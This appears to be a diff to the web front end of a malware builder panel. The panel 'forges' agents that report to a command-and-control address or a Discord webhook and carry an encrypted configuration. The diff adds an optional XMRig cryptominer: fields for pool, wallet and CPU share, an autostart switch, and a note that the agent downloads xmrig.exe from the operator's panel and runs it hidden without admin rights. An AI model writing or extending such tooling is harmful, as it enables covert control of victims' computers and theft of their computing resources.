@@ -148,6 +148,23 @@ footer .sep{color:var(--line)}
       <span>encrypt config — seal target with a per-build random key</span>
     </label>
   </div>
+  <details style="margin-top:6px">
+    <summary style="cursor:pointer;font-size:11px;color:var(--dim);text-transform:uppercase;letter-spacing:.5px">
+      ⛏ miner defaults — open-source <a href="https://github.com/xmrig/xmrig" target="_blank" rel="noopener" style="color:var(--cyn)">XMRig</a> (optional)
+    </summary>
+    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px">
+      <input type="text" id="mpool" placeholder="pool host[:port]" style="flex:2;min-width:200px" autocomplete="off" spellcheck="false">
+      <input type="text" id="mwallet" placeholder="XMR wallet" style="flex:2;min-width:200px" autocomplete="off" spellcheck="false">
+      <input type="text" id="mcpu" placeholder="cpu% (1-100, def 50)" style="flex:1;min-width:130px" autocomplete="off">
+    </div>
+    <div class="switch-row" style="margin-top:10px">
+      <label class="switch-label">
+        <input type="checkbox" id="mstart" class="switch-input">
+        <span>autostart miner — idle unless both fields set; panel can start/stop anytime</span>
+      </label>
+    </div>
+    <div class="hint">baked into the sealed config; agent downloads xmrig.exe from your panel, runs hidden, no admin, reversible with STOP.</div>
+  </details>
   <div class="btn-row">
     <button class="btn btn-primary" id="forgeBtn" onclick="forge()">⚒️ FORGE</button>
     <button class="btn btn-ghost" onclick="viewSrc()">👁 VIEW SRC</button>
@@ -205,6 +222,14 @@ async function forge(){
   const v=target.value.trim();
   const body={encrypt:enc.checked};
   if(/discord\.com\/api\/webhooks\//.test(v)) body.webhook=v; else body.c2=v;
+  const pool=document.getElementById('mpool').value.trim(),
+        wallet=document.getElementById('mwallet').value.trim(),
+        cpu=parseInt(document.getElementById('mcpu').value||'')||0,
+        autostart=document.getElementById('mstart').checked;
+  if(pool||wallet){
+    if(!pool||!wallet){say('⚠ miner needs BOTH pool and wallet (or leave both empty)','err');toastSay('miner incomplete',1);return;}
+    body.miner={pool,wallet,autostart}; if(cpu)body.miner.cpu=cpu;
+  }
   try{
     const r=await fetch('/build/'+mode,{method:'POST',headers:H(),body:JSON.stringify(body)});
     if(mode==='jar'){
